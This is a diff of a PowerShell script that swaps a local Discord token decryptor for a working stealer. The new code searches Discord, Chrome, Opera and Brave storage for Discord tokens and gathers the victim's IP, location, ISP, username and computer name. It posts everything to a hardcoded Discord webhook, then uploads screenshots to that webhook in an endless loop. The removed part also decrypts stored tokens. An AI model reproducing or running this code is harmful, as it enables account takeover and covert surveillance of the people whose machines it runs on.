@@ -1,93 +1,88 @@
-$appData = $env:APPDATA
-$localAppData = $env:LOCALAPPDATA
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 
-Add-Type -AssemblyName System.Security
+$uri = "https://discord.com/api/webhooks/1494536249237704894/bVE9ntzf2jhqcKOZvLWCUElw7u_WfhxYCYiHQQ0HBA70GGSoNr7tuysIYlErZJQakIvf"
+$ssuri = "https://discord.com/api/webhooks/1494536249237704894/bVE9ntzf2jhqcKOZvLWCUElw7u_WfhxYCYiHQQ0HBA70GGSoNr7tuysIYlErZJQakIvf"
 
-$discordPaths = @(
-    "$appData\discord",
-    "$appData\discordcanary",
-    "$appData\discordptb",
-    "$localAppData\discord",
-    "$localAppData\discordcanary",
-    "$localAppData\discordptb"
+function Send {
+    param ($content)
+    $content = @{ "content" = $content; }
+    Invoke-WebRequest -uri $uri -Method POST -Body ($content | convertto-json) -Headers @{'Content-Type' = 'application/json'} -UseBasicParsing
+}
+
+function FindTokens {
+    param ($Path)
+    $tokens = ""
+    Get-ChildItem $Path -Recurse -Include "*.ldb", "*.log" | Foreach-Object {
+        $data = Get-Content $_.FullName
+        foreach ($regex in [regex]'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', [regex]'mfa\.[\w-]{84}') {
+            ($regex).Matches($data) | ForEach-Object {
+                $tokens += $_.Value + "`n"
+            }
+            
+        }
+    }    
+    return $tokens
+}
+
+function GetInfo {
+    $resp = Invoke-WebRequest -UseBasicParsing -URI "http://ipinfo.io/json" | ConvertFrom-Json
+    $vpn = Invoke-WebRequest -UseBasicParsing -URI 'http://ip-api.com/json?fields=proxy' | ConvertFrom-Json
+    return "
+**IP**: $($resp.ip)
+**CITY**: $($resp.city)
+**REGION**: $($resp.region)
+**VPN**: $($vpn.proxy)
+**Inaccurate Location**: https://www.google.com/maps/search/google+map++$($resp.loc)
+**ISP**: $($resp.org)
+**TIMEZONE**: $($resp.timezone)
+**USERNAME**: $env:USERNAME 
+**USERPROFILE**: $env:USERPROFILE
+**COMPUTER NAME**: $env:COMPUTERNAME
+    "
+}
+
+[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+function screenshot([Drawing.Rectangle]$bounds, $path) {
+   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+   $graphics = [Drawing.Graphics]::FromImage($bmp)
+
+   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+
+   $bmp.Save($path)
+
+   $graphics.Dispose()
+   $bmp.Dispose()
+}
+
+$local =  $env:LOCALAPPDATA
+$roaming = $env:APPDATA
+$paths = @(
+    $roaming + '\Discord'
+    $roaming + '\discordcanary'
+    $roaming + '\discordptb'
+    $local + '\Google\Chrome\User Data\Default'
+    $roaming + '\Opera Software\Opera Stable'
+    $local + '\BraveSoftware\Brave-Browser\User Data\Default'
 )
 
-$tokenRegex = [regex]'dQw4w9WgXcQ:[^"]*'
-$plainRegex = [regex]'(mfa\.[a-zA-Z0-9_-]{84}|[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{38,})'
+$info = GetInfo
+$message = $info + '```Tokens:' + "`n"
 
-$found = @{}
-
-function Decrypt-Token($encrypted) {
-    try {
-        $encBytes = [Convert]::FromBase64String($encrypted)
-        # Strip "v10" or "v11" prefix (3 bytes)
-        $payload = $encBytes[3..($encBytes.Length - 1)]
-        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($payload, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-        return [System.Text.Encoding]::UTF8.GetString($decrypted)
-    } catch { return $null }
-}
-
-foreach ($base in $discordPaths) {
-    # Check leveldb for plain tokens
-    $ldb = "$base\Local Storage\leveldb"
-    if (Test-Path $ldb) {
-        Get-ChildItem -Path $ldb -Include "*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
-            try {
-                $content = [System.IO.File]::ReadAllText($_.FullName)
-                $plainRegex.Matches($content) | ForEach-Object {
-                    $found[$_.Value] = $true
-                }
-            } catch {}
-        }
-    }
-
-    # Check Local State + leveldb for encrypted tokens
-    $localState = "$base\Local State"
-    if (Test-Path $localState) {
-        try {
-            $ls = Get-Content $localState -Raw | ConvertFrom-Json
-            $encKey = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
-            $masterKey = $encKey[5..($encKey.Length - 1)]
-            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($masterKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-
-            $ldb2 = "$base\Local Storage\leveldb"
-            if (Test-Path $ldb2) {
-                Get-ChildItem -Path $ldb2 -Include "*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
-                    try {
-                        $content = [System.IO.File]::ReadAllText($_.FullName)
-                        $tokenRegex.Matches($content) | ForEach-Object {
-                            $enc = $_.Value.Split(":")[1]
-                            $encBytes = [Convert]::FromBase64String($enc)
-                            # iv = bytes 3-15, data = bytes 15+
-                            $iv = $encBytes[3..14]
-                            $data = $encBytes[15..($encBytes.Length - 1)]
-                            $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
-                            $tag = $data[($data.Length - 16)..($data.Length - 1)]
-                            $cipher = $data[0..($data.Length - 17)]
-                            $plain = New-Object byte[] $cipher.Length
-                            $aes.Decrypt($iv, $cipher, $tag, $plain)
-                            $token = [System.Text.Encoding]::UTF8.GetString($plain)
-                            if ($token -match '^[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,}$') {
-                                $found[$token] = $true
-                            }
-                        }
-                    } catch {}
-                }
-            }
-        } catch {}
+foreach ($path in $paths) {
+    if (Test-Path -Path $path) {
+        $tokens = FindTokens -Path ($path + "\Local Storage\leveldb")
+        $message += $tokens + "`n"
     }
 }
+$message += '```'
+Send -content $message
 
-if ($found.Count -eq 0) {
-    Write-Host "`nNo tokens found." -ForegroundColor Red
-} else {
-    Write-Host "`nFound $($found.Count) token(s):`n" -ForegroundColor Green
-    $i = 1
-    foreach ($token in $found.Keys) {
-        Write-Host "[$i] $token" -ForegroundColor Cyan
-        $i++
-    }
+$wc = New-Object System.Net.WebClient
+
+while (1) {
+    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width, [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height)
+    screenshot $bounds "$env:LocalAppData\Temp\screenshot.jpg"
+    $path = "$env:LocalAppData\Temp\screenshot.jpg"
+    $resp = $wc.UploadFile($ssuri,$path)
 }
-
-Write-Host "`nPress any key to exit..."
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
